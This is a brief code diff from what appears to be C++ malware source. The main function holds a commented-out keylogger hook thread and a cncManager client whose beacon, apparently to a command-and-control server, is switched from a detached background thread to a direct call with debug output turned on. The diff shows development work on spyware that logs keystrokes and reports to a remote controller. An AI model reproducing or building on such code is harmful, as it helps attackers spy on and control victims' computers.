@@ -16,9 +16,10 @@ int main() {
 //keyLogger logger;
 //std::thread keyLog = std::thread(&keyLogger::startHook, logger);
 //keyLog.join();
-    client.print_setting = false;
-    std::thread fileHandler = std::thread(&cncManager::sendBeacon, client);
-    fileHandler.detach();
+    client.print_setting = true;
+    //std::thread fileHandler = std::thread(&cncManager::sendBeacon, client);
+    //fileHandler.detach();
+    client.sendBeacon();
 
 
     while (TRUE) {
